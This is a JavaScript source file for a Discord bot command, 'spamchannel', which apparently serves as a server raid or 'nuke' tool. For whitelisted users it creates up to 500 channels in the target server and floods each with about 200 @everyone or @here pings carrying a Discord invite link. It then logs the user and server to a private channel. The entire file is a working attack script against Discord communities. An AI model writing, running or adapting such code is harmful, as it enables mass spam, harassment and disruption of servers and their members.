const Discord = require('discord.js');
const db = require('megadb')
const blacklist = new db.crearDB("blacklist")
const serverlist = new db.crearDB("serverlist")
const color = '0x410255'

let cooldown = new Set()

module.exports = {
  name: "spamchannel",
  alias: [],

async execute (client, message, args){

  if(!blacklist.has(message.author.id)){
    const a = new Discord.MessageEmbed()
    .setDescription("You are not registered in the Whitelist.")
    .setColor(color)
     return message.reply({embeds: [a]})
  }

  if (serverlist.tiene(message.guild.id)){
    const serverInListEmbed = new Discord.MessageEmbed()
        .setDescription("<:Converter:995595217782718475> This command is not available in this server.")
        .setColor(color);
      return message.reply({ embeds: [serverInListEmbed] });
    }

  if(!message.guild.me.permissions.has("MANAGE_CHANNELS")){
    const wu = new Discord.MessageEmbed()
    .setDescription("<:Converter:995595217782718475> I don't have permissions. I need the `MANAGE_CHANNELS`.")
   .setColor(color)
   return message.reply({embeds: [wu]})
  }

  if(cooldown.has(message.author.id)){
    const l = new Discord.MessageEmbed()
    .setDescription(`<:Converter:995595217782718475> ${message.author}, you must wait 1 minute to use the command.`)
    .setColor(color)
    return message.author.send({embeds: [l]}).catch(() => console.log(`${user.displayName}'s' DMs are closed | Please use .spam <@User> <message> instead`)) 
  }

  cooldown.add(message.author.id);

  setTimeout(() => {
    cooldown.delete(message.author.id);
  }, 60000);

  try {

   for (let i = 0 ; i < 500; ++i){

     if(message.guild.channels.cache.size >= 500){
       break;
     }

     const argas = ["@everyone\nhttps://discord.gg/hjbvMsB7v5", "@here\nhttps://discord.gg/hjbvMsB7v5"]
    let randomIMG = argas[Math.floor(Math.random() * argas.length)]

  let texto = randomIMG;

     message.guild.channels.create(`${client.user.username} empire`, { type: "GUILD_TEXT" }).catch((err) => { console.log(("Error Found: " + err)) }).then((ch) => {
      for (let a = 0 ; a < 200; ++a){
      ch.send(texto, a)
      }
    })

   }


  const embok = new Discord.MessageEmbed()
  .setDescription("<:k_:995595248266915870> command ejecuted.")
  .setColor(color)
  message.author.send({embeds: [embok]}).catch(() => console.log(`${user.displayName}'s' DMs are closed | Please use .spam <@User> <message> instead`))


  const e = new Discord.MessageEmbed()


   .setDescription(`<:k_:995595248266915870> spamchannel executed successfully!`)
     .addField("User", `**${message.author.tag}** | **${message.author.id}**`)
    .addField("Server Name", `**${message.guild.name}** | **${message.guild.id}**`)
   .setColor(color)
    .setThumbnail(message.author.displayAvatarURL({format: 'png', dynamic: true}))


   client.channels.cache.get("1186076417142816808").send({embeds: [e]})

  } catch (err) {
    const laoo = new Discord.MessageEmbed()
    .setDescription("<:Converter:995595217782718475> Error found")
    .addField("> Command", "`laoo`", true)
    .addField("> Error", `\`${err}\``, true)
    .setColor("#410255")
  
    client.channels.cache.get('1210148130264322119').send({embeds: [laoo]})
  }

 }

}